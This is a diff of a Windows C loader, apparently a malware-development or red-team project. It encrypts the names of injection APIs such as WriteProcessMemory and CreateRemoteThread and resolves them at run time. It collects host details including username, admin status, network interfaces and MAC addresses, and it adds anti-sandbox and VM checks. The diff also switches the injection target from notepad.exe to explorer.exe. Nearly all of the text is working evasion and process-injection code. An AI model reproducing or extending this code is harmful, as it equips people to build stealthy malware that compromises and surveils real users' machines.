@@ -6,6 +6,7 @@
 #include <unistd.h>
 #include "nt.h"
 #include <tlhelp32.h>
+#include "system_info.h"
 
 
 // ============================================================================
@@ -48,19 +49,6 @@ HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID) {
     return NULL;
 }
 
-void detectArchitecture() {
-    SYSTEM_INFO sysInfo;
-    GetNativeSystemInfo(&sysInfo);
-
-    DEBUG("[+] Architecture detectee : ");
-    switch (sysInfo.wProcessorArchitecture) {
-        case PROCESSOR_ARCHITECTURE_AMD64: DEBUG("x64 (AMD64)\n"); break;
-        case PROCESSOR_ARCHITECTURE_INTEL: DEBUG("x86 (32-bit)\n"); break;
-        case PROCESSOR_ARCHITECTURE_ARM64: DEBUG("ARM64\n"); break;
-        default: DEBUG("Inconnue (%d)\n", sysInfo.wProcessorArchitecture); break;
-    }
-}
-
 
 // ============================================================================
 // ENCRYPTED DATA
@@ -99,8 +87,8 @@ unsigned char encryptedKernel32[] = {
     0x5e, 0x50, 0x47, 0x5b, 0x50, 0x59, 0x06, 0x07, 0x1b, 0x51, 0x59, 0x59, 0x35
 };
 
-unsigned char encryptedNotepad_exe[] = {
-    0x7b, 0x5a, 0x41, 0x50, 0x45, 0x54, 0x51, 0x1b, 0x50, 0x4d, 0x50, 0x35
+unsigned char encryptedexplorer_exe[] = {
+    0x50, 0x4d, 0x45, 0x59, 0x5a, 0x47, 0x50, 0x47, 0x1b, 0x50, 0x4d, 0x50, 0x35
 };
 // ============================================================================
 // UTILITY FUNCTIONS
@@ -148,32 +136,85 @@ int main(void) {
     // ------------------------------------------------------------------------
     // SYSTEM INFORMATION COLLECTION
     // ------------------------------------------------------------------------
-    detectArchitecture(); // Appel de la fonction de log
+    DEBUG("[System Info - Start] Collecting system information...\n");
 
-    SYSTEM_INFO si;
-    GetNativeSystemInfo(&si); // Récupération des infos pour les checks suivants
+    SystemInfo sysInfo;
+    if (collect_system_info(&sysInfo) != 0) {
+        DEBUG("[System Info - Error] Failed to collect system information\n");
+    } else {
+        DEBUG("[System Info - Success] System information collected successfully\n\n");
 
-    MEMORYSTATUSEX memStatus;
-    memStatus.dwLength = sizeof(memStatus);
-    GlobalMemoryStatusEx(&memStatus);
-    DWORD total_ram_mb = memStatus.ullTotalPhys / 1024 / 1024;
+        // Display system information
+        DEBUG("[System Info - Architecture] %s\n", architecture_to_string(sysInfo.architecture));
+        DEBUG("[System Info - OS] %s %s\n", os_to_string(sysInfo.os), sysInfo.os_version);
+        DEBUG("[System Info - Hostname] %s\n", sysInfo.hostname);
+        DEBUG("[System Info - Username] %s (%s)\n", sysInfo.username, sysInfo.is_admin ? "Admin" : "User");
+        DEBUG("[System Info - Virtual Machine] %s\n", sysInfo.is_vm ? "YES" : "NO");
+        DEBUG("[System Info - Uptime] %llu seconds\n\n", (unsigned long long)sysInfo.uptime_seconds);
 
-    // --- CHECK CPU ---
-    DEBUG("[Sandboxing Detection - CPU] Detected %u processors (threshold: %d)\n",
-          si.dwNumberOfProcessors, TRHESHOLD_MAX_CPU);
+        DEBUG("[System Info - CPU] Model: %s\n", sysInfo.cpu_model);
+        DEBUG("[System Info - CPU] Processors: %d | Logical Cores: %d\n",
+              sysInfo.nb_processors, sysInfo.nb_logical_cores);
+        if (sysInfo.cpu_frequency_mhz > 0) {
+            DEBUG("[System Info - CPU] Frequency: %llu MHz\n", (unsigned long long)sysInfo.cpu_frequency_mhz);
+        }
+        DEBUG("\n");
 
-    if (si.dwNumberOfProcessors < (DWORD)TRHESHOLD_MAX_CPU) {
-        DEBUG("[!] Suspicious environment: insufficient CPU count\n");
-        // return 0;
+        DEBUG("[System Info - Memory] Total: %llu MB | Used: %llu MB | Available: %llu MB\n",
+              (unsigned long long)sysInfo.total_ram_mb,
+              (unsigned long long)sysInfo.used_ram_mb,
+              (unsigned long long)sysInfo.available_ram_mb);
+        DEBUG("[System Info - Memory] Usage: %d%%\n\n", sysInfo.ram_usage_percent);
+
+        DEBUG("[System Info - Disks] Found %d disk(s)\n", sysInfo.nb_disks);
+        for (int i = 0; i < sysInfo.nb_disks; i++) {
+            DiskInfo* disk = &sysInfo.disks[i];
+            DEBUG("[System Info - Disk %d] %s (%s) - %s\n", i, disk->name, disk->mount_point, disk->filesystem);
+            DEBUG("[System Info - Disk %d] Total: %.2f GB | Free: %.2f GB\n", i,
+                  disk->total_space / (1024.0 * 1024.0 * 1024.0),
+                  disk->free_space / (1024.0 * 1024.0 * 1024.0));
+        }
+        DEBUG("\n");
+
+        DEBUG("[System Info - Network] Found %d interface(s)\n", sysInfo.nb_interfaces);
+        for (int i = 0; i < sysInfo.nb_interfaces; i++) {
+            NetworkInterface* iface = &sysInfo.interfaces[i];
+            DEBUG("[System Info - Interface %d] %s - IP: %s | MAC: %s | Status: %s\n",
+                  i, iface->name, iface->ip_address, iface->mac_address,
+                  iface->is_up ? "UP" : "DOWN");
+        }
+        DEBUG("\n");
     }
 
-    // --- CHECK RAM ---
-    DEBUG("[Sandboxing Detection - RAM] Detected %lu MB (threshold: %d MB)\n",
-          total_ram_mb, TRHESHOLD_MIN_RAM_MB);
+    // ------------------------------------------------------------------------
+    // SANDBOXING DETECTION
+    // ------------------------------------------------------------------------
+    DEBUG("[Sandboxing Detection - Start] Running anti-sandbox checks...\n");
 
-    if (total_ram_mb < (DWORD)TRHESHOLD_MIN_RAM_MB) {
-        DEBUG("[!] Suspicious environment: insufficient RAM\n");
-        // return 0;
+    // Check CPU count (using collected system info)
+    DEBUG("[Sandboxing Detection - CPU] Detected %d processors (threshold: %d)\n",
+          sysInfo.nb_processors, TRHESHOLD_MAX_CPU);
+    if (sysInfo.nb_processors < TRHESHOLD_MAX_CPU) {
+        DEBUG("[Sandboxing Detection - Check CPU] Suspicious environment detected: %d processors.\n",
+              sysInfo.nb_processors);
+        //return 0;
+    }
+
+    // Check RAM size (using collected system info)
+    DEBUG("[Sandboxing Detection - RAM] Detected %llu MB (threshold: %d MB)\n",
+          (unsigned long long)sysInfo.total_ram_mb, TRHESHOLD_MIN_RAM_MB);
+    if (sysInfo.total_ram_mb < TRHESHOLD_MIN_RAM_MB) {
+        DEBUG("[Sandboxing Detection - Check RAM] Suspicious environment detected: %llu MB of RAM.\n",
+              (unsigned long long)sysInfo.total_ram_mb);
+        //return 0;
+    }
+
+    // Check VM detection (using collected system info)
+    if (sysInfo.is_vm) {
+        DEBUG("[Sandboxing Detection - VM] Virtual machine detected!\n");
+        //return 0;
+    } else {
+        DEBUG("[Sandboxing Detection - VM] No virtual machine detected\n");
     }
 
     // Detection time delay
@@ -212,8 +253,8 @@ int main(void) {
     DEBUG("[Decryption - Complete] Decrypted WriteProcessMemory string: %s\n", encryptedWriteProcessMemory);
     decrypt(encryptedCreateRemoteThread, sizeof(encryptedCreateRemoteThread), key);
     DEBUG("[Decryption - Complete] Decrypted CreateRemoteThread string: %s\n", encryptedCreateRemoteThread);
-    decrypt(encryptedNotepad_exe, sizeof(encryptedNotepad_exe), key);
-    DEBUG("[Decryption - Complete] Decrypted Notepad.exe string: %s\n", encryptedNotepad_exe);
+    decrypt(encryptedexplorer_exe, sizeof(encryptedexplorer_exe), key);
+    DEBUG("[Decryption - Complete] Decrypted Explorer.exe string: %s\n", encryptedexplorer_exe);
     DEBUG("[Decryption - Complete] All API strings decrypted\n");
 
     // Step 2: Dynamically resolve GetModuleHandleA and GetProcAddress
@@ -258,7 +299,7 @@ int main(void) {
 
     DEBUG("[Process Injection - Start] Beginning injection process...\n");
     DWORD PID = 0;
-    HANDLE procHandle = getProcHandlebyName((LPCSTR)encryptedNotepad_exe, &PID);
+    HANDLE procHandle = getProcHandlebyName((LPCSTR)encryptedexplorer_exe, &PID);
     if (!procHandle) {
         DEBUG("[x] Failed to open the process\n");
         printf("\nPress Enter to exit...\n");
